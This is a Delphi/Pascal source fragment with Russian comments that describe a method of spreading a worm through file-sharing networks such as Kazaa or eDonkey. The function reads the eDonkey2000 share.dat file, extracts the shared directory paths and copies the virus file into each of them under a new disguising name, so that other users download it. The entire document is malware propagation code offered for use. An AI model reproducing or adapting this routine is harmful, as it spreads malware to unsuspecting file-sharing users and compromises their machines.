{    
   Второй метод состоит в том что можно распространять червь через
   системы обмена файлами, к примеру Kazaa или eDonkey
}


function eDonkey2000(PathToDonkeyDir,PathToVirus,NewNameOfVirus:string):string;
{
PathToDonkeyDir - Путь к программе
PathToVirus - Путь к нашему вирусу
NewNameOfVirus - Новоя имя файла у вирусав расшаренных директорях eDonkey2000
}                                                      
var
     f:file;
     buf:array [0..30000]of byte;
     dirs:array[0..20]of string;
     filetext,text:string;
     i,n:integer;
begin
     assignfile(f,PathToDonkeyDir+'share.dat');
     n:=1;
     reset(f,1);
     BlockRead(f,buf,filesize(f));
     for i:=0 to filesize(f) do
     begin
         if (buf[i]>31)and(buf[i]<>13)and(buf[i]<>37) then
            begin
                 if (buf[i]=67)and(buf[i+1]=58)
                  then
                     begin
                        inc(n);
                        dirs[n]:=dirs[n]+Chr(buf[i]);
                        filetext:=filetext+#13+Chr(buf[i])
                     end
                     else
                     begin
                        filetext:=filetext+Chr(buf[i]);
                        dirs[n]:=dirs[n]+Chr(buf[i])
                     end;
            end;
     end;
     result:=filetext;
     for i:=1 to 20 do
     begin
       CopyFile(Pchar(PathToVirus),Pchar(dirs[i]+'\'+NewNameOfVirus),true);
     end;
     closefile(f);
     ShowMessage(filetext);
end;
